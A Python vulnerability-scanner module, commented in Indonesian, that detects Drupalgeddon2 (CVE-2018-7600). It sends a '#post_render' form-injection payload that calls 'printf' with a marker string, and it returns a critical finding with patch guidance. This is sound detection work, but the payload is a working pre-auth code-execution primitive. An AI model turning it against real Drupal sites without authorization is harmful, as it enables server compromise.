"""Drupal Drupalgeddon2 (CVE-2018-7600) probe.

Auto-validation: probe form-element render hook dengan marker safe (`printf`
+ string CYBLOK). Bila marker muncul di response = vulnerable.

Catatan etika: scanner ini *tidak* eksekusi command sistem; hanya validasi
echo via `printf`. Untuk PoC RCE penuh perlu izin tertulis.
"""
from __future__ import annotations

from urllib.parse import urljoin

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig

# Marker echo: pakai printf untuk validate eksekusi callable tanpa command sistem
TARGETS = [
    "/?q=user/password&name[%23post_render][]=printf"
    "&name[%23markup]=CYBLOK_DGN2_%25s"
    "&name[%23type]=markup",
    "/user/password?name[%23post_render][]=printf"
    "&name[%23markup]=CYBLOK_DGN2_%25s"
    "&name[%23type]=markup",
]

POST_DATA = "form_id=user_pass&_triggering_element_name=name"
MARKER = "CYBLOK_DGN2_"


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        for tgt in TARGETS:
            url = urljoin(target.origin + "/", tgt.lstrip("/"))
            r = client.post(url, data=POST_DATA,
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            allow_redirects=False)
            if r is None:
                continue
            body = r.text or ""
            if MARKER in body:
                findings.append(Finding(
                    module="drupalgeddon2",
                    title="Drupalgeddon2 (CVE-2018-7600) terkonfirmasi — RCE pre-auth",
                    severity=Severity.CRITICAL,
                    description=(
                        "Form `user/password` Drupal 7/8 memproses array "
                        "`#post_render` user-controlled. Marker `CYBLOK_DGN2_` "
                        "dipantulkan setelah callable `printf` -> form render "
                        "API mengeksekusi callable arbitrer = RCE pra-auth."
                    ),
                    target=url,
                    urls=[url],
                    evidence=f"POST {url} -> body memuat marker '{MARKER}'",
                    cwe="CWE-94",
                    confidence="confirmed",
                    remediation=(
                        "Upgrade Drupal core ke 7.58 / 8.3.9 / 8.4.6 / 8.5.1 "
                        "atau lebih baru. Bila tidak bisa upgrade, terapkan "
                        "patch SA-CORE-2018-002 secara manual. Pertimbangkan "
                        "WAF rule untuk pola `[#post_render]` di parameter."
                    ),
                    references=[
                        "https://www.drupal.org/sa-core-2018-002",
                        "https://nvd.nist.gov/vuln/detail/CVE-2018-7600",
                    ],
                ))
                break
    finally:
        client.close()
    return findings
